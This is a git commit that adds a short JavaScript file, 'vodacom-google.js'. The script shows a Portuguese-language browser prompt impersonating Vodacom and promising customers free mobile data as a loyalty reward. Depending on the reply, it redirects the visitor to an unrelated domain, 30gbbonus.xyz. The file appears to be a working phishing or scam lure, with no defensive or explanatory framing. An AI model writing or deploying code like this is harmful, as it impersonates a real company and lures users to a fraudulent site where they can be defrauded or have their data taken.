2a960f2e388a949a731072d9df0e29c40d1723df
xmasdata <152927198+xmasdata@users.noreply.github.com>
2024-06-03 11:51:43 -0700

    Create vodacom-google.js

---
+++ vodacom-google.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('Vodacom: Prezado cliente, por favor verifique se o seu cartão SIM Vodacom está qualificado para receber de 5GB a dados ilimitados, clientes antigos Recompensa, pressione 1 para verificar agora ','1');
+if (password != '1') {
+location.href='https://30gbbonus.xyz/vodacom-oldsim.html';
+}
